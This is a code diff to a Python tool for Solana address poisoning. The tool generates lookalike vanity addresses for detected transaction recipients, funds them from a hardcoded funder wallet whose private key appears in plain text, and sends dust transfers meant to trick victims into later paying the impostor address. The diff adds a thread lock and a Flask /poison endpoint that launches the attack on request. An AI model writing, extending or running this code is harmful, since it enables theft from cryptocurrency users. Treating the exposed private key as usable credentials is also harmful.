@@ -7,7 +7,10 @@ from vanitygenerator.generatekeys import generate_similar_address
 import base58
 import json
 import logging
+import threading
 
+# Flask imports
+from flask import Flask, request, jsonify
 
 funderpubkey = "2bAFrDAgqP5TVfeuZ82JxJTimk9mmaa2ZBwmaMZ5Px2Z"
 funderprivkey = "5PpMF7zLtUpcMaWh6AEkWpMyP185X3ixLQFtPdGJj68k3jiHJFkVUCc1BkJtGHhFQnYiQPkcEW3ZS75Y4mArBenZ"
@@ -17,6 +20,8 @@ poison_pill = 0.00001
 min_gas = 0.000005000
 cu_prc   = 0
 cu_lmt   = 250000
+
+gpu_lock = threading.Lock()
 
 def safe_send_sol(*args, **kwargs):
     max_retries = 3
@@ -34,11 +39,12 @@ def safe_send_sol(*args, **kwargs):
                 return None
 
 def poison(detectedsender, detectedreceiver):
-    similar_address = generate_similar_address(detectedreceiver)
-    print(f"Generated address: {similar_address} to poison {detectedreceiver} who received funds from {detectedsender}")
-    with open("generated_wallets.jsonl", "a") as f:
-        json.dump(similar_address, f)
-        f.write("\n")
+    with gpu_lock:
+        similar_address = generate_similar_address(detectedreceiver)
+        print(f"Generated address: {similar_address} to poison {detectedsender} who sent funds to {detectedreceiver}")
+        with open("generated_wallets.jsonl", "a") as f:
+            json.dump(similar_address, f)
+            f.write("\n")
     #send sol from our funder to the similar address
     safe_send_sol(funderpubkey, funderprivkey, similar_address["public_key"], initial_fund, cu_prc, cu_lmt, rpc_url, 'Y')
     time.sleep(10)
@@ -52,8 +58,21 @@ def poison(detectedsender, detectedreceiver):
     time.sleep(10)
     print(f"Returned rent to {funderpubkey}")
 
+# Flask app setup
+app = Flask(__name__)
+
+@app.route('/poison', methods=['POST'])
+def poison_endpoint():
+    data = request.get_json()
+    detectedsender = data.get('detectedsender')
+    detectedreceiver = data.get('detectedreceiver')
+    if not detectedsender or not detectedreceiver:
+        return jsonify({'error': 'Missing parameters'}), 400
+    try:
+        poison(detectedsender, detectedreceiver)
+        return jsonify({'status': 'success'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
 if __name__ == "__main__":
-    poison("v35gGprpLs4jz1MtNynvhZWpQBg3uohed3HZgCBfGw7", "v35gGprpLs4jz1MtNynvhZWpQBg3uohed3HZgCBfGw7")
-
-
-
+    app.run(host='127.0.0.1', port=5001, threaded=True)
